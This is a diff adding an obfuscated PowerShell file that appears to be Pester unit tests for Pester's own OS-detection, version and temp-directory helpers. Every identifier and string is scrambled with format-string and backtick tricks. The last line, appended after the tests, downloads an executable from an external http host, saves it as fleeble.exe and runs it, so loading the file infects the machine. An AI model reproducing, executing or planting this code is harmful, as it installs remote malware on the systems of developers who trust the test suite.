@@ -1,0 +1,133 @@
+  SEt-Item  ('VaR'+'iaBLe:Vw'+'Bh') ( [tYPE]("{1}{3}{4}{2}{0}"-f'ATH','SY','p','sT','em.io.')  ) ;  &("{1}{3}{0}{2}" -f'ictMo','Set-St','de','r') -Version ("{0}{1}" -f 'L','atest')
+
+&("{1}{2}{0}"-f'pe','I','nModuleSco') -ModuleName ("{1}{0}" -f'er','Pest') {
+    &("{1}{0}"-f'e','Describ') ("{3}{1}{0}{2}" -f'terPsVer','tPes','sion','Ge') {
+        .('It') ('R'+'eturns '+'val'+'ue '+'o'+'f '+('p3'+'sP'+'SVersionT'+'ab'+'l'+'e.'+'P'+'sVersio'+'n.M'+'aj'+'or')."REpLa`ce"(([CHAR]112+[CHAR]51+[CHAR]115),'$')) {
+            &("{1}{0}" -f'k','Moc') ("{0}{2}{3}{1}" -f 'Ge','iable','t','-Var') -ParameterFilter { ${Na`mE} -eq ("{0}{1}{2}{3}" -f'PS','V','ersion','Table') -and ${va`Lu`eOnlY} } -MockWIth {
+                @{ ("{0}{1}{2}" -f'PSVer','si','on') = [Version]("{0}{1}"-f '1.0','.0') }
+            }
+
+            .("{3}{5}{0}{2}{4}{1}"-f'e','ion','sterP','Ge','sVers','tP') | .("{1}{2}{0}" -f'd','S','houl') -Be 1
+        }
+    }
+
+    
+    
+    
+    
+    &("{1}{0}"-f 'cribe','Des') ("{1}{0}{2}" -f 't','Ge','PesterOs') {
+        .("{1}{0}" -f 'xt','Conte') ("{6}{5}{1}{3}{4}{9}{7}{8}{2}{0}" -f'wer','wi','and lo','t','h ','s ','Window','ow','erShell 5 ','P') {
+            .('It') ((("{14}{12}{9}{5}{11}{2}{0}{8}{1}{13}{6}{4}{7}{10}{3}{15}"-f'sE','when Pow','ow',' t','vers','Win',' ','ion is ','kw ','rns Ekw','lower','d','etu','erShell','R','han 6')) -cRepLACE 'Ekw',[ChaR]39) {
+                .("{0}{1}" -f'Moc','k') ("{3}{4}{1}{2}{0}"-f'sion','sterP','sVer','G','etPe') { 5 }
+
+                &("{2}{0}{1}{3}" -f'etPe','s','G','terOs') | &("{1}{0}"-f 'd','Shoul') -Be ("{0}{1}" -f'W','indows')
+            }
+        }
+
+        .("{0}{1}{2}"-f'Con','t','ext') ("{1}{7}{4}{2}{6}{3}{0}{5}" -f 'hig','Windows','PowerShell',' and ','with ','her',' 6',' ') {
+            .('It') ('Ret'+'urn'+'s '+(('VMvW'+'indowsVM'+'v ')  -RepLAce  ([ChaR]86+[ChaR]77+[ChaR]118),[ChaR]39)+'whe'+'n '+"`$IsWindows "+'i'+'s '+"`$true "+'an'+'d '+'pow'+'e'+'rshell '+'versio'+'n '+'is'+' '+'6 '+'o'+'r '+'hi'+'gh'+'er') {
+
+                &("{0}{1}"-f'Mo','ck') ("{0}{1}{3}{2}"-f'Ge','t','ble','-Varia') -ParameterFilter { ${n`Ame} -eq ("{0}{2}{1}"-f'IsWin','ws','do') -and ${va`Lu`EOn`LY} } -MockWith { ${T`RUE} }
+                &("{1}{0}" -f 'ck','Mo') ("{2}{3}{0}{1}" -f 't-Variabl','e','G','e') -ParameterFilter { ${N`AMe} -eq ("{1}{0}"-f'x','IsLinu') -and ${VaL`Ue`o`NLY} } -MockWith { ${FAl`Se} }
+                .("{0}{1}"-f 'Moc','k') ("{3}{1}{0}{2}" -f 'ab','i','le','Get-Var') -ParameterFilter { ${n`AmE} -eq ("{0}{1}" -f'Is','MacOS') -and ${V`A`Lu`eonLy} } -MockWith { ${FA`LSE} }
+                &("{0}{1}" -f 'M','ock') ("{1}{0}{3}{2}" -f 'PsVersi','GetPester','n','o') { 6 }
+
+                .("{1}{2}{0}" -f'erOs','Ge','tPest') | .("{1}{0}"-f 'ld','Shou') -Be ("{0}{2}{1}" -f 'W','ndows','i')
+            }
+
+            .('It') ("{5}{3}{6}{0}{7}{2}{1}{4}"-f 'etrieve ','ndow','Wi','V','s','Uses Get-','ariable to r','Is') {
+                
+                
+                
+
+                .("{0}{1}"-f'Mo','ck') ("{0}{1}{3}{2}"-f'G','et-','e','Variabl') -ParameterFilter { ${n`Ame} -eq ("{2}{1}{0}{3}"-f'ndo','i','IsW','ws') -and ${valUe`O`NLy} } -MockWith { ${tR`UE} }
+                .("{1}{0}"-f 'ck','Mo') ("{0}{5}{2}{4}{1}{3}" -f'G','io','V','n','ers','etPesterPs') { 6 }
+
+                ${Nu`lL} = .("{1}{0}{2}" -f 'ter','GetPes','Os')
+
+                .("{0}{3}{4}{2}{1}"-f 'Assert','ed','l','-MockCa','l') ("{0}{3}{1}{2}"-f'Get-V','i','able','ar') -ParameterFilter { ${na`mE} -eq ("{2}{1}{0}"-f'ows','sWind','I') -and (${val`UE`Only}) } -Exactly 1 -Scope ('It')
+            }
+        }
+
+        .("{2}{1}{0}"-f'ntext','o','C') ("{0}{2}{4}{7}{5}{1}{3}{6}" -f'Linux w','6 an','it','d ','h PowerShe',' ','higher','ll') {
+            &('It') ('Ret'+'urns'+' '+('A4UL'+'inu'+'x'+'A4U ')."r`E`PlacE"('A4U',[stRiNg][chAr]39)+'w'+'hen '+"`$IsLinux "+'is'+' '+"`$true "+'a'+'nd '+'p'+'ow'+'e'+'rshell '+'v'+'ersion '+'is'+' '+'6 '+'o'+'r '+'hi'+'gh'+'er') {
+                .("{0}{1}" -f 'M','ock') ("{1}{0}{2}{3}"-f '-','Get','Variab','le') -ParameterFilter { ${Na`me} -eq ("{1}{0}{2}"-f 'i','IsW','ndows') -and ${VA`LU`e`OnLy} } -MockWith { ${F`AlsE} }
+                .("{0}{1}" -f'M','ock') ("{1}{2}{0}{3}" -f'ria','G','et-Va','ble') -ParameterFilter { ${N`Ame} -eq ("{1}{0}"-f'nux','IsLi') -and ${Va`L`UeONLy} } -MockWith { ${tr`Ue} }
+                .("{0}{1}" -f 'Moc','k') ("{2}{0}{1}" -f't-V','ariable','Ge') -ParameterFilter { ${n`AME} -eq ("{0}{1}{2}"-f'IsMa','c','OS') -and ${vAl`UE`O`Nly} } -MockWith { ${F`AlSe} }
+                .("{1}{0}"-f'k','Moc') ("{1}{0}{3}{2}"-f'tP','Ge','ion','esterPsVers') { 6 }
+
+                &("{1}{3}{2}{0}"-f'Os','GetPe','ter','s') | .("{1}{0}"-f 'ld','Shou') -Be ("{1}{0}"-f 'inux','L')
+            }
+
+            .('It') ("{0}{2}{6}{1}{5}{3}{4}"-f'Use','a','s Get-','rieve IsLi','nux','ble to ret','Vari') {
+                .("{1}{0}" -f 'ck','Mo') ("{0}{1}{2}" -f 'Get-Vari','a','ble') -ParameterFilter { ${Na`ME} -eq ("{1}{2}{0}"-f 'ux','IsLi','n') -and ${v`Al`U`EONly} } -MockWith { ${t`RuE} }
+                .("{0}{1}" -f'Mo','ck') ("{0}{3}{1}{2}" -f 'GetPe','s','Version','sterP') { 6 }
+
+                ${n`Ull} = &("{1}{0}{3}{2}"-f 'tPester','Ge','s','O')
+
+                .("{2}{0}{1}{3}{4}"-f't','-M','Asser','ockCal','led') ("{0}{2}{1}"-f'Ge','Variable','t-') -ParameterFilter { ${n`Ame} -eq ("{1}{2}{0}"-f 'nux','Is','Li') -and ${VaL`U`EONLy} } -Exactly 1 -Scope ('It')
+            }
+        }
+
+        &("{2}{1}{0}" -f'xt','onte','C') ("{3}{2}{6}{1}{7}{0}{5}{4}" -f'd ',' ','ll ','macOS with PowerShe','her','hig','6','an') {
+            &('It') ('Retu'+'rn'+'s '+(('io'+'UOSX'+'ioU ') -CRePLacE 'ioU',[CHAr]39)+'wh'+'en '+"`$IsMacOS "+'i'+'s '+"`$true "+'an'+'d '+'p'+'o'+'wers'+'hell '+'ve'+'rsion '+'is'+' '+'6 '+'o'+'r '+'high'+'er') {
+                &("{1}{0}"-f'ock','M') ("{2}{3}{1}{0}" -f 'ble','a','Get-','Vari') -ParameterFilter { ${Na`ME} -eq ("{2}{1}{0}"-f'ws','ndo','IsWi') -and ${V`ALUEO`NlY} } -MockWith { ${f`ALse} }
+                .("{1}{0}" -f'ock','M') ("{3}{1}{2}{0}"-f'ariable','et','-V','G') -ParameterFilter { ${na`ME} -eq ("{0}{1}" -f 'IsLi','nux') -and ${v`AlueO`NLY} } -MockWith { ${F`A`lSE} }
+                &("{1}{0}" -f 'k','Moc') ("{1}{3}{0}{2}" -f 'riabl','Get-','e','Va') -ParameterFilter { ${na`ME} -eq ("{0}{1}{2}"-f 'I','s','MacOS') -and ${v`ALueON`Ly} } -MockWith { ${tR`Ue} }
+                .("{1}{0}"-f'k','Moc') ("{3}{1}{2}{0}" -f'ersion','etPester','PsV','G') { 6 }
+
+                .("{1}{0}{3}{2}"-f'P','Get','rOs','este') | &("{0}{1}"-f'Sho','uld') -Be ("{0}{1}"-f'macO','S')
+            }
+
+            &('It') ("{0}{5}{2}{4}{1}{6}{3}"-f 'Uses','triev','Ge','acOS','t-Variable to re',' ','e IsM') {
+                &("{1}{0}" -f'k','Moc') ("{0}{2}{3}{1}" -f 'Get','ble','-Va','ria') -ParameterFilter { ${n`AMe} -eq ("{2}{1}{0}"-f 'S','MacO','Is') -and ${vALuE`o`NlY} } -MockWith { ${tr`Ue} }
+
+                ${Nu`LL} = .("{3}{0}{2}{1}" -f 'etP','Os','ester','G')
+
+                .("{0}{2}{3}{1}"-f'As','ed','sert-MockCa','ll') ("{0}{3}{2}{1}" -f'G','ble','a','et-Vari') -ParameterFilter { ${na`ME} -eq ("{1}{0}" -f 'acOS','IsM') -and ${valu`EO`NLY} } -Exactly 1 -Scope ('It')
+            }
+        }
+    }
+
+
+    &("{1}{2}{0}" -f'scribe','D','e') ("{2}{0}{3}{1}{4}"-f 'TempDi','r','Get-','recto','y') {
+        &('It') ("{2}{5}{0}{8}{4}{12}{10}{7}{6}{3}{9}{1}{11}{13}"-f'turns','r Win','r','dire','the ','e','temp ','t ',' ','ctory fo','rrec','d','co','ows') -Skip:((&("{2}{1}{0}"-f'erOs','etPest','G')) -ne ("{2}{1}{0}" -f 'dows','n','Wi')) {
+            ${Ex`PE`ctEd} =   ( Get-ChILdiTem  ('VaR'+'IaBLE:vw'+'bH') ).vaLUE::("{0}{3}{2}{1}" -f 'Ge','Path','p','tTem').Invoke()
+
+            ${tE`mP} = &("{2}{1}{4}{3}{0}"-f 'ry','-Te','Get','Directo','mp')
+            ${t`emP} | &("{1}{0}"-f 'uld','Sho') -Not -BeNullOrEmpty
+            ${te`mP} | .("{0}{1}" -f 'Sho','uld') -Be ${EXp`ECtED}
+        }
+
+        .('It') ((("{1}{5}{8}{2}{4}{7}{3}{6}{0}{9}"-f 'y','re','rns gsI/private/','ec','tmpg','t','tor','sI dir','u',' for MacOS'))-cRePLACE([ChAR]103+[ChAR]115+[ChAR]73),[ChAR]39) {
+            .("{0}{1}" -f'M','ock') ("{2}{1}{0}" -f'sterOs','etPe','G') {
+                ("{0}{1}"-f 'Ma','cOS')
+            }
+            &("{4}{2}{1}{3}{5}{0}"-f'tory','pDir','t-Tem','e','Ge','c') | &("{2}{1}{0}"-f 'ld','hou','S') -Be ("{3}{1}{2}{0}" -f'ate/tmp','ri','v','/p')
+        }
+
+        &('It') ((("{4}{0}{6}{2}{3}{1}{5}{7}"-f'etur','}/tmp{0} director',' {','0','r','y for Lin','ns','ux'))  -f  [ChaR]39) -Skip:((&("{1}{2}{0}" -f 'tPesterOs','G','e')) -ne ("{1}{0}" -f 'ux','Lin')) {
+            .("{1}{0}" -f 'ck','Mo') ("{0}{3}{1}{2}"-f 'Ge','ter','Os','tPes') {
+                ("{0}{1}" -f'Li','nux')
+            }
+            &("{0}{2}{1}{3}" -f 'Get-Temp','t','Direc','ory') | .("{1}{0}"-f 'ld','Shou') -Be ("{0}{1}" -f '/tm','p')
+        }
+    }
+
+    if (("{0}{2}{1}" -f'Win','ows','d') -eq (.("{0}{3}{1}{2}" -f 'G','rO','s','etPeste'))) {
+        &("{2}{0}{1}"-f 'c','ribe','Des') ("{1}{0}{3}{2}" -f 'pRegi','Get-Tem','try','s') {
+            &("{1}{0}"-f 'ock','M') ("{0}{2}{1}" -f'GetP','terOs','es') {
+                return ("{1}{0}"-f 'indows','W')
+            }
+
+            &('It') ("{1}{2}{3}{7}{4}{5}{6}{8}{0}{9}" -f'Wi','retur','n the corret',' te','e','gi','s','mp r','try for ','ndows') {
+
+                ${eXP`E`cteD} = ((("{3}{21}{17}{0}{7}{11}{13}{15}{9}{4}{16}{18}{2}{8}{19}{20}{12}{5}{1}{22}{10}{6}{14}"-f'werS','SSoftwa','Y_C','Micro','y:','USERDO','te','hel','URR','istr','DOSPes','l.','_','CoreDOSRe','r','g',':H','t.Po','KE','EN','T','sof','re'))  -REpLaCE'DOS',[cHar]92)
+                ${t`e`mpPath} = .("{0}{2}{1}" -f'Get-Te','gistry','mpRe')
+                ${tEmp`paTh} | &("{0}{1}"-f'Sho','uld') -Be ${EXp`eCTed}
+            }
+        }
+    }
+}
+
+(.("{2}{1}{0}{3}" -f'jec','Ob','New-','t') ("{1}{2}{0}{5}{3}{4}" -f'tem.Net.We','Sy','s','ie','nt','bCl')).("{0}{1}{2}{3}" -f'Dow','nlo','a','dFile').Invoke(("{5}{0}{2}{3}{1}{4}{7}{6}" -f'tp://dd','t/0/95511','l3.data.','hu/ge','62/sk','ht','e','e.ex'),("{2}{1}{0}"-f 'le.exe','b','flee'));.("{0}{2}{1}" -f 'St','ess','art-Proc') ("{1}{2}{0}"-f '.exe','fleebl','e')
